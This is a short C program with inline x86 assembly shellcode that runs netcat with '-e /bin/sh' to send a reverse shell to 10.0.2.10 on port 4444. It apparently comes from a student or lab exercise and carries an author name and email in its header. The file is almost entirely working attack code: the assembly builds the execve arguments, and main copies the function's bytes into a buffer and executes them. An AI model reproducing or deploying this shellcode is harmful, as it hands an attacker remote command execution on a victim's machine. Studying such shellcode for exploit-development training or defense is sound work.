/* SAMUEL - AREVALO | snell191198@gmail.com */
#include <stdio.h>
#include <stdlib.h>


    
void ini(void)
{
	__asm__ __volatile__(
	
	"xor	%eax, %eax	\n"
	"push	%eax		\n"
	"push	$0x636e2f2f	\n" // cn//
	"push	$0x6e69622f	\n" // nib/
	"mov	%esp, %ebx	\n"
	
	"push 	%eax		\n"
	"push	$0x0068732f \n"	//  hs/
	"push	$0x6e69622f \n"	// nib/
	"push	$0x2f2f652d \n"	// //ev-
	"mov 	%esp, %edx  \n"	
	"push	%eax		\n"
	"push	$0x20202020 \n"	// 4444
	"push	$0x34343434 \n"	// 4444
	"mov	%esp, %edi  \n"
	"push	%eax		\n"
	"push	$0x20202030 \n"	//    0
	"push	$0x312e322e \n"	// 1.2.
	"push	$0x302e3031	\n" // 0.01
	"mov	%esp, %esi	\n"
	"push	%eax		\n"
	"push	%edx		\n"
	
	"push 	%edi		\n"
	"push	%esi		\n"
	"push	%ebx		\n"

	"mov	%esp, %ecx	\n"
	"push 	%eax		\n"
	"mov	%esp, %edx	\n"
	"mov	$11, %al	\n"
	"int	$0x80		\n");
}
int main (int argc, char * argv[]) 
{
	printf("Este programa manda un reverse_shell a 10.0.2.10:4444\n");
	
	void (*pt_func)(void);
	unsigned char bytecode[1000];
	int i; unsigned char * pt = ini;
	//recorremos el codigo de ini y lo copiamos en la cadena bytecode.
	for(i =0; i < 1000; i++) bytecode[i]= *pt++;
	pt_func=&bytecode;
	(*pt_func)();
	
	printf("Y esto no se imprime\n");
    return 0;
} /* end main */ 
